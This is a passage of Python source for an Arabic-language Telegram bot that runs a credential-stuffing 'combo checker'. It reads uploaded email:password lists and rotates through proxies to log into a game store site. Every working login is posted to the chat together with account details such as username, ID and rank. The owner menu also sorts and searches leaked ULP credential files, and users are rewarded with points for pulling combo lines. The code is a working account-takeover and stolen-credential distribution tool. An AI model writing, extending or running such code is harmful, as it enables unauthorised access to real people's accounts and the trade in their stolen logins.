        }
        
        login_response = session.post(login_url, data=payload, headers=login_headers, timeout=15)
        
        if login_response.status_code != 200:
            return None
        
        try:
            login_json = login_response.json()
        except:
            return None
        
        if login_json.get("result") != "OK":
            return None
        
        redirect_url = login_json.get("redirect")
        if redirect_url:
            session.get(redirect_url, headers=headers, timeout=15)
        
        time.sleep(0.5)
        
        store_response = session.get(main_url, headers=headers, timeout=15)
        
        if store_response.status_code != 200:
            return None
        
        user_data = extract_user_info(store_response.text)
        
        if user_data.get('has_game_data'):
            return {
                'email': email,
                'password': password,
                'user_data': user_data,
                'is_valid': True
            }
        else:
            return None
        
    except Exception:
        return None

def process_single_account_checker(email, password):
    result = perform_full_login(email, password, None)
    if result:
        return result
    
    proxy = None
    with checker_lock:
        available = [p for p in checker_proxy_list if p not in checker_failed_proxies]
        if available:
            proxy = random.choice(available)
    
    if proxy:
        result = perform_full_login(email, password, proxy)
        if result:
            return result
    
    return None

async def update_counter_message(client: Client, chat_id: int):
    global counter_message_id
    while checker_active:
        try:
            if checker_stats['total'] > 0 and checker_stats['start_time']:
                progress = (checker_stats['checked'] / checker_stats['total']) * 100 if checker_stats['total'] > 0 else 0
                elapsed = int(time.time() - checker_stats['start_time']) if checker_stats['start_time'] else 0
                text = (
                    f"📊 <b>عداد الفحص المباشر</b>\n\n"
                    f"📁 إجمالي الحسابات: <b>{checker_stats['total']:,}</b>\n"
                    f"✅ تم الفحص: <b>{checker_stats['checked']:,}</b> ({progress:.1f}%)\n"
                    f"🎯 الحسابات الصالحة: <b>{checker_stats['valid']:,}</b>\n"
                    f"❌ الحسابات الفاشلة: <b>{checker_stats['invalid']:,}</b>\n"
                    f"⏱️ الوقت المنقضي: <b>{elapsed} ثانية</b>"
                )
                
                if counter_message_id:
                    try:
                        await client.edit_message_text(chat_id, counter_message_id, text)
                    except:
                        pass
                else:
                    msg = await client.send_message(chat_id, text)
                    counter_message_id = msg.id
        except:
            pass
        
        await asyncio.sleep(300)

async def run_checker(client: Client, chat_id: int):
    global checker_active, counter_message_id, checker_proxy_list, checker_failed_proxies
    
    if checker_active:
        await client.send_message(chat_id, "⚠️ الفحص جاري بالفعل!")
        return
    
    # جمع جميع ملفات الحسابات
    combo_files = []
    if os.path.exists(CHECKER_FILES_DIR):
        for f in os.listdir(CHECKER_FILES_DIR):
            if f.endswith('.txt'):
                combo_files.append(os.path.join(CHECKER_FILES_DIR, f))
    
    if not combo_files:
        await client.send_message(chat_id, "❌ لا توجد ملفات حسابات! أضف ملفات أولاً.")
        return
    
    # تحميل البروكسيات
    checker_proxy_list = []
    checker_failed_proxies = set()
    if os.path.exists(CHECKER_PROXY_PATH):
        try:
            with open(CHECKER_PROXY_PATH, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        normalized = normalize_proxy(line)
                        if normalized:
                            checker_proxy_list.append(normalized)
        except:
            pass
    
    # تحميل جميع الحسابات من جميع الملفات
    accounts = []
    for file_path in combo_files:
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            accounts.append((parts[0].strip(), parts[1].strip()))
        except:
            continue
    
    if not accounts:
        await client.send_message(chat_id, "❌ لا توجد حسابات صالحة في الملفات")
        return
    
    checker_active = True
    checker_stats['total'] = len(accounts)
    checker_stats['checked'] = 0
    checker_stats['valid'] = 0
    checker_stats['invalid'] = 0
    checker_stats['start_time'] = time.time()
    counter_message_id = None
    
    await client.send_message(
        chat_id, 
        f"🚀 بدأ الفحص!\n"
        f"📁 عدد الملفات: <b>{len(combo_files)}</b>\n"
        f"📊 إجمالي الحسابات: <b>{len(accounts):,}</b>\n"
        f"🔢 عدد الخيوط: <b>3</b>"
    )
    
    asyncio.create_task(update_counter_message(client, chat_id))
    
    batch_size = 15
    
    for batch_idx in range(0, len(accounts), batch_size):
        batch = accounts[batch_idx:batch_idx + batch_size]
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = {executor.submit(process_single_account_checker, email, pwd): (email, pwd) for email, pwd in batch}
            
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=60)
                    with checker_results_lock:
                        checker_stats['checked'] += 1
                        if result:
                            checker_stats['valid'] += 1
                            user_data = result['user_data']
                            message = (
                                f"✅ <b>حساب نشط مع معلومات لعبة</b>\n\n"
                                f"📧 الإيميل: <code>{result['email']}</code>\n"
                                f"🔑 كلمة المرور: <code>{result['password']}</code>\n"
                                f"👤 الاسم: <code>{user_data.get('username', 'غير موجود')}</code>\n"
                                f"🆔 Account ID: <code>{user_data.get('account_id', 'غير موجود')}</code>\n"
                                f"📊 Player Rank: <code>{user_data.get('player_rank', 'غير موجود')}</code>\n"
                                f"🔗 حالة الربط: {'مرتبط ✅' if user_data.get('is_linked') else 'غير مرتبط ❌'}"
                            )
                            await client.send_message(chat_id, message)
                        else:
                            checker_stats['invalid'] += 1
                except Exception:
                    with checker_results_lock:
                        checker_stats['checked'] += 1
                        checker_stats['invalid'] += 1
        
        time.sleep(1)
    
    checker_active = False
    
    elapsed = int(time.time() - checker_stats['start_time']) if checker_stats['start_time'] else 0
    final_text = (
        f"📊 <b>التقرير النهائي للفحص</b>\n\n"
        f"📁 إجمالي الملفات: <b>{len(combo_files)}</b>\n"
        f"📊 إجمالي الحسابات: <b>{checker_stats['total']:,}</b>\n"
        f"✅ تم الفحص: <b>{checker_stats['checked']:,}</b>\n"
        f"🎯 الحسابات الصالحة: <b>{checker_stats['valid']:,}</b>\n"
        f"❌ الحسابات الفاشلة: <b>{checker_stats['invalid']:,}</b>\n"
        f"⏱️ الوقت الإجمالي: <b>{elapsed} ثانية</b>"
    )
    await client.send_message(chat_id, final_text)

# ==================== الكيبوردات ====================
def owner_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🔍 بحث عن دومين"), KeyboardButton("📂 فرز ملفات ULP")],
        [KeyboardButton("📤 رفع ملف ULP"), KeyboardButton("📊 الإحصائيات")],
        [KeyboardButton("🗑 حذف حسب دومين"), KeyboardButton("✅ تفعيل البوت")],
        [KeyboardButton("🚫 إغلاق البوت"), KeyboardButton("📢 إذاعة للأعضاء")],
        [KeyboardButton("⚙️ إعدادات الاشتراك"), KeyboardButton("📈 عدد العمليات")],
        [KeyboardButton("🔥 الأكثر والأقل طلباً"), KeyboardButton("🎁 إنشاء رابط هدية")],
        [KeyboardButton("➕ إرسال نقاط ID"), KeyboardButton("⚙️ نقاط الإحالة")],
        [KeyboardButton("📢 إضافة إعلان قناة"), KeyboardButton("🧾 قناة السجل")],
        [KeyboardButton("💎 إحصائيات النقاط"), KeyboardButton("👥 الأكثر نشاطاً")],
        [KeyboardButton("🚫 حظر عضو"), KeyboardButton("✅ فك حظر عضو")],
        [KeyboardButton("💣 حذف كل البيانات"), KeyboardButton("📈 حالة البوت")],
        [KeyboardButton("🔐 فحص الحسابات")]
    ], resize_keyboard=True)

def user_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🔍 بحث عن دومين")],
        [KeyboardButton("💰 رصيدي ونقاطي"), KeyboardButton("📋 آخر العمليات")],
        [KeyboardButton("🎁 المكافأة اليومية"), KeyboardButton("🔗 رابط الإحالة")],
        [KeyboardButton("📺 قنوات الإعلانات"), KeyboardButton("📊 إحصائياتي")]
    ], resize_keyboard=True)

# ==================== /start ====================
@app.on_message(filters.command("start"))
async def start_handler(client: Client, message: Message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name or "عضو"
    username = f"@{message.from_user.username}" if message.from_user.username else "بدون يوزر"

    args = message.command
    ensure_user(user_id)

    banned, reason = is_user_banned(user_id)
    if banned and not is_owner(user_id):
        await message.reply(f"🚫 أنت محظور من استخدام البوت.\nالسبب: {reason}")
        return

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, referred_by FROM users WHERE user_id = ?", (user_id,))
    existing = cursor.fetchone()
    is_existing_user = existing is not None

    if not is_existing_user:
        cursor.execute(
            "INSERT INTO users (user_id, points, is_blocked) VALUES (?, 0, 0)",
            (user_id,)
        )
        conn.commit()
        notify_text = (
            f"👤 <b>عضو جديد دخل البوت!</b>\n\n"
            f"• الاسم: <b>{first_name}</b>\n"
            f"• اليوزر: {username}\n"
            f"• الآيدي: <code>{user_id}</code>"
        )
        for owner in OWNER_IDS:
            try:
                await client.send_message(owner, notify_text)
            except Exception:
                pass

    if len(args) > 1:
        ref_payload = args[1]
        if ref_payload.startswith("gift_"):
            code = ref_payload.replace("gift_", "")
            cursor.execute("SELECT points, used_by FROM gifts WHERE code = ?", (code,))
            gift = cursor.fetchone()
            if gift:
                if gift["used_by"] is not None:
                    await message.reply("⚠️ تم استخدام رابط الهدية هذا سابقاً!")
                else:
                    pts = float(gift["points"])
                    cursor.execute("UPDATE gifts SET used_by = ? WHERE code = ?", (user_id, code))
                    conn.commit()
                    add_user_points(user_id, pts)
                    await message.reply(f"🎁 مبروك! حصلت على <b>{pts}</b> نقطة من رابط الهدية.")
            else:
                await message.reply("❌ كود الهدية غير صالح.")
        elif ref_payload.isdigit():
            referrer_id = int(ref_payload)
            if referrer_id != user_id and not is_existing_user:
                cursor.execute(
                    "UPDATE users SET referred_by = ? WHERE user_id = ?",
                    (referrer_id, user_id)
                )
                conn.commit()
                base_pts = get_referral_points()
                if base_pts > 0:
                    add_user_points(referrer_id, base_pts)
                try:
                    extra = get_advanced_referral_points()
                    msg_ref = (
                        f"🎉 <b>انضم عضو جديد عبر رابطك!</b>\n\n"
                        f"✅ حصلت على <b>{base_pts}</b> نقطة.\n"
                    )
                    if extra > 0:
                        msg_ref += f"➕ وستحصل على <b>{extra}</b> نقطة بعد إكمال <b>عمليتين سحب</b>."
                    await client.send_message(referrer_id, msg_ref)
                except Exception:
                    pass

    conn.close()

    if is_owner(user_id):
        pts = get_user_points(user_id)
        text = (
            f"أهلاً بك في <b>بوت الكومبو والخدمات السريعة</b>\n\n"
            f"نقاطك الحالية: <b>{pts}</b>\n\n"
            f"قناتي: https://t.me/+91X31VNWIU1iNDM8\n"
            f"يوزري: @D3_1D"
        )
        await message.reply(text, reply_markup=owner_keyboard())
        return

    if not bot_enabled_for_users:
        await message.reply("⚠️ البوت حالياً مغلق عن الأعضاء.")
        return

    is_ok, missing = await check_subscription(client, user_id)
    if not is_ok:
        await send_force_sub_message(client, user_id, missing)
        return

    row = get_user_row(user_id)
    level = row["level"] if row else "عادي"
    emoji = get_level_emoji(level)
    pts = get_user_points(user_id)

    text = (
        f"أهلاً بك في <b>بوت الكومبو والخدمات السريعة</b>\n\n"
        f"نقاطك الحالية: <b>{pts}</b>\n"
        f"مستواك: {emoji} <b>{level}</b>\n\n"
        f"قناتي: https://t.me/+91X31VNWIU1iNDM8\n"
        f"يوزري: @D3_1D"
    )
    await message.reply(text, reply_markup=user_keyboard())

# ==================== زر التحقق من الاشتراك ====================
@app.on_callback_query(filters.regex("^check_force_sub$"))
async def check_force_sub_callback(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    is_ok, missing = await check_subscription(client, user_id, force_refresh=True)

    if is_ok:
        await callback.answer("✅ تم التحقق بنجاح! أهلاً بك", show_alert=False)
        subscription_cache[user_id] = time.time()
        row = get_user_row(user_id)
        level = row["level"] if row else "عادي"
        emoji = get_level_emoji(level)
        pts = get_user_points(user_id)

        text = (
            f"أهلاً بك في <b>بوت الكومبو والخدمات السريعة</b>\n\n"
            f"نقاطك الحالية: <b>{pts}</b>\n"
            f"مستواك: {emoji} <b>{level}</b>\n\n"
            f"قناتي: https://t.me/+91X31VNWIU1iNDM8\n"
            f"يوزري: @D3_1D"
        )
        try:
            await callback.message.edit_text(text)
        except Exception:
            pass
        await client.send_message(user_id, "🏠 القائمة الرئيسية:", reply_markup=user_keyboard())
    else:
        await callback.answer("❌ لم تشترك في كل القنوات بعد!", show_alert=True)
        await send_force_sub_message(client, user_id, missing, edit_message=callback.message)

async def force_sub_guard(client: Client, message: Message) -> bool:
    user_id = message.from_user.id
    if is_owner(user_id):
        return True
    banned, reason = is_user_banned(user_id)
    if banned:
        await message.reply(f"🚫 أنت محظور.\nالسبب: {reason}")
        return False
    if not bot_enabled_for_users:
        await message.reply("⚠️ البوت مغلق.")
        return False
    is_ok, missing = await check_subscription(client, user_id)
    if not is_ok:
        await send_force_sub_message(client, user_id, missing)
        return False
    return True

# ==================== أزرار الفحص ====================
@app.on_message(filters.regex("^🔐 فحص الحسابات$") & filters.user(OWNER_IDS))
async def checker_menu(client: Client, message: Message):
    # عرض عدد الملفات الموجودة
    combo_files_count = 0
    if os.path.exists(CHECKER_FILES_DIR):
        combo_files_count = len([f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')])
    
    proxy_exists = "✅ موجود" if os.path.exists(CHECKER_PROXY_PATH) else "❌ غير موجود"
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ إضافة ملف حسابات", callback_data="add_combo_file")],
        [InlineKeyboardButton("🗑 حذف ملف محدد", callback_data="delete_specific_combo_file")],
        [InlineKeyboardButton("🗑 حذف كل ملفات الحسابات", callback_data="delete_all_combo_files")],
        [InlineKeyboardButton("➕ إضافة ملف بروكسيات", callback_data="add_proxy_file")],
        [InlineKeyboardButton("🗑 حذف ملف البروكسيات", callback_data="delete_proxy_file")],
        [InlineKeyboardButton("🚀 بدء الفحص (كل الملفات)", callback_data="start_checker")],
        [InlineKeyboardButton("📊 حالة الفحص", callback_data="checker_status")]
    ])
    
    text = (
        f"🔐 <b>قسم فحص الحسابات</b>\n\n"
        f"📁 عدد ملفات الحسابات: <b>{combo_files_count}</b>\n"
        f"🌐 ملف البروكسيات: {proxy_exists}\n\n"
        f"اختر العملية المطلوبة:"
    )
    await message.reply(text, reply_markup=kb)

@app.on_callback_query(filters.regex("^add_combo_file$") & filters.user(OWNER_IDS))
async def add_combo_file_cb(client: Client, callback: CallbackQuery):
    user_action_state[callback.from_user.id] = "awaiting_checker_combo_file"
    await callback.answer("أرسل ملف الحسابات الآن (يمكنك إرسال أكثر من ملف)")
    await callback.message.edit_text("📁 أرسل ملف الحسابات (email:password لكل سطر)\nيمكنك إرسال أكثر من ملف")

@app.on_callback_query(filters.regex("^delete_specific_combo_file$") & filters.user(OWNER_IDS))
async def delete_specific_combo_file_cb(client: Client, callback: CallbackQuery):
    files = []
    if os.path.exists(CHECKER_FILES_DIR):
        files = [f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')]
    
    if not files:
        await callback.answer("لا توجد ملفات", show_alert=True)
        return
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🗑 {f}", callback_data=f"del_specific_{f}")] for f in files
    ])
    await callback.answer("اختر الملف للحذف")
    await callback.message.edit_text("اختر الملف الذي تريد حذفه:", reply_markup=kb)

@app.on_callback_query(filters.regex("^del_specific_") & filters.user(OWNER_IDS))
async def del_specific_file_cb(client: Client, callback: CallbackQuery):
    filename = callback.data.replace("del_specific_", "")
    filepath = os.path.join(CHECKER_FILES_DIR, filename)
    
    if os.path.exists(filepath):
        try:
            os.remove(filepath)
            await callback.answer(f"تم حذف {filename}", show_alert=True)
        except Exception as e:
            await callback.answer(f"خطأ: {e}", show_alert=True)
    else:
        await callback.answer("الملف غير موجود", show_alert=True)
    
    # تحديث القائمة
    files = []
    if os.path.exists(CHECKER_FILES_DIR):
        files = [f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')]
    
    if files:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"🗑 {f}", callback_data=f"del_specific_{f}")] for f in files
        ])
        await callback.message.edit_text("اختر الملف الذي تريد حذفه:", reply_markup=kb)
    else:
        await callback.message.edit_text("🗑 تم حذف جميع الملفات")

@app.on_callback_query(filters.regex("^delete_all_combo_files$") & filters.user(OWNER_IDS))
async def delete_all_combo_files_cb(client: Client, callback: CallbackQuery):
    if os.path.exists(CHECKER_FILES_DIR):
        for f in os.listdir(CHECKER_FILES_DIR):
            if f.endswith('.txt'):
                try:
                    os.remove(os.path.join(CHECKER_FILES_DIR, f))
                except:
                    pass
    
    await callback.answer("تم حذف جميع ملفات الحسابات", show_alert=True)
    await callback.message.edit_text("🗑 تم حذف جميع ملفات الحسابات من الاستضافة")

@app.on_callback_query(filters.regex("^add_proxy_file$") & filters.user(OWNER_IDS))
async def add_proxy_file_cb(client: Client, callback: CallbackQuery):
    user_action_state[callback.from_user.id] = "awaiting_checker_proxy_file"
    await callback.answer("أرسل ملف البروكسيات الآن")
    await callback.message.edit_text("📁 أرسل ملف البروكسيات")

@app.on_callback_query(filters.regex("^delete_proxy_file$") & filters.user(OWNER_IDS))
async def delete_proxy_file_cb(client: Client, callback: CallbackQuery):
    if os.path.exists(CHECKER_PROXY_PATH):
        try:
            os.remove(CHECKER_PROXY_PATH)
            await callback.answer("تم حذف ملف البروكسيات", show_alert=True)
            await callback.message.edit_text("🗑 تم حذف ملف البروكسيات من الاستضافة")
        except Exception as e:
            await callback.answer(f"خطأ: {e}", show_alert=True)
    else:
        await callback.answer("لا يوجد ملف بروكسيات", show_alert=True)
        await callback.message.edit_text("⚠️ لا يوجد ملف بروكسيات محفوظ")

@app.on_callback_query(filters.regex("^start_checker$") & filters.user(OWNER_IDS))
async def start_checker_cb(client: Client, callback: CallbackQuery):
    files = []
    if os.path.exists(CHECKER_FILES_DIR):
        files = [f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')]
    
    if not files:
        await callback.answer("لا توجد ملفات حسابات! أضف ملفات أولاً", show_alert=True)
        return
    
    await callback.answer("جارِ بدء الفحص...")
    await callback.message.edit_text("🚀 بدأ الفحص...")
    
    asyncio.create_task(run_checker(client, callback.message.chat.id))

@app.on_callback_query(filters.regex("^checker_status$") & filters.user(OWNER_IDS))
async def checker_status_cb(client: Client, callback: CallbackQuery):
    if checker_active and checker_stats['start_time']:
        progress = (checker_stats['checked'] / checker_stats['total']) * 100 if checker_stats['total'] > 0 else 0
        elapsed = int(time.time() - checker_stats['start_time'])
        text = (
            f"📊 <b>حالة الفحص الحالية</b>\n\n"
            f"📁 إجمالي الحسابات: <b>{checker_stats['total']:,}</b>\n"
            f"✅ تم الفحص: <b>{checker_stats['checked']:,}</b> ({progress:.1f}%)\n"
            f"🎯 الحسابات الصالحة: <b>{checker_stats['valid']:,}</b>\n"
            f"❌ الحسابات الفاشلة: <b>{checker_stats['invalid']:,}</b>\n"
            f"⏱️ الوقت المنقضي: <b>{elapsed} ثانية</b>"
        )
    else:
        text = "📊 <b>لا يوجد فحص جاري حالياً</b>"
    
    await callback.answer("تم التحديث")
    await callback.message.edit_text(text)

@app.on_message(filters.document & filters.user(OWNER_IDS))
async def handle_checker_files(client: Client, message: Message):
    user_id = message.from_user.id
    state = user_action_state.get(user_id)
    
    if state == "awaiting_checker_combo_file":
        # لا ننهي الحالة - نسمح بإرسال ملفات متعددة
        try:
            temp_path = await message.download()
            if temp_path and os.path.exists(temp_path):
                filename = message.document.file_name or f"combo_{int(time.time())}.txt"
                target_path = os.path.join(CHECKER_FILES_DIR, filename)
                
                # إذا كان الملف موجود، أضف رقم
                if os.path.exists(target_path):
                    base, ext = os.path.splitext(filename)
                    target_path = os.path.join(CHECKER_FILES_DIR, f"{base}_{int(time.time())}{ext}")
                
                shutil.copy2(temp_path, target_path)
                os.remove(temp_path)
                
                with open(target_path, 'r', encoding='utf-8', errors='ignore') as f:
                    count = sum(1 for line in f if line.strip() and ':' in line)
                
                # عد إجمالي الملفات
                total_files = len([f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')])
                
                await message.reply(
                    f"✅ تم حفظ الملف!\n"
                    f"📁 الملف: <b>{filename}</b>\n"
                    f"📊 عدد الحسابات: <b>{count:,}</b>\n"
                    f"📂 إجمالي الملفات المحفوظة: <b>{total_files}</b>\n\n"
                    f"يمكنك إرسال ملف آخر أو الضغط على زر بدء الفحص"
                )
            else:
                await message.reply("❌ فشل تحميل الملف")
        except Exception as e:
            await message.reply(f"❌ خطأ: {e}")
        return
    
    if state == "awaiting_checker_proxy_file":
        user_action_state.pop(user_id, None)
        try:
            temp_path = await message.download()
            if temp_path and os.path.exists(temp_path):
                shutil.copy2(temp_path, CHECKER_PROXY_PATH)
                os.remove(temp_path)
                
                with open(CHECKER_PROXY_PATH, 'r', encoding='utf-8', errors='ignore') as f:
                    count = sum(1 for line in f if line.strip())
                
                await message.reply(f"✅ تم حفظ ملف البروكسيات!\n📁 عدد البروكسيات: <b>{count:,}</b>")
            else:
                await message.reply("❌ فشل تحميل الملف")
        except Exception as e:
            await message.reply(f"❌ خطأ: {e}")
        return
    
    if user_action_state.get(user_id) == "awaiting_ulp_upload":
        await handle_large_document(client, message)
        return

# ==================== باقي الدوال كما هي ====================
# (البحث والسحب والإدارة - نفس الكود السابق)

if __name__ == "__main__":
    print("🤖 Bot is running with multi-file checker...")
    app.run()
